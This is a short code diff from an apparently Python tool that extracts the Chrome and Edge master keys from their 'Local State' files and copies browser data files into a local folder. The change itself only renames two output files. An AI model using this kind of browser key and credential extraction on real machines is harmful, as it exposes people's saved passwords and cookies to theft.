@@ -54,10 +54,10 @@ def main():
     if not os.path.exists("Sourse_Data/"):
         os.makedirs("Sourse_Data/")
     if os.path.isfile(os.environ["USERPROFILE"] + os.sep + TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"]):
-        master_key_path = "Sourse_Data/chrome_masterkey"
+        master_key_path = "Sourse_Data/Chrome_masterkey"
         get_master_key(TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
     if os.path.isfile(os.environ["USERPROFILE"] + os.sep + TARGET_FILE_PATH["EDGE_LOCAL_STATE_FILE_PATH"]):
-        master_key_path = "Sourse_Data/edge_masterkey"
+        master_key_path = "Sourse_Data/Edge_masterkey"
         get_master_key(TARGET_FILE_PATH["EDGE_LOCAL_STATE_FILE_PATH"], master_key_path)
     for file_path in TARGET_FILE_PATH:
         copy_data(TARGET_FILE_PATH[file_path], SOURSE_DATA_PATH[file_path])
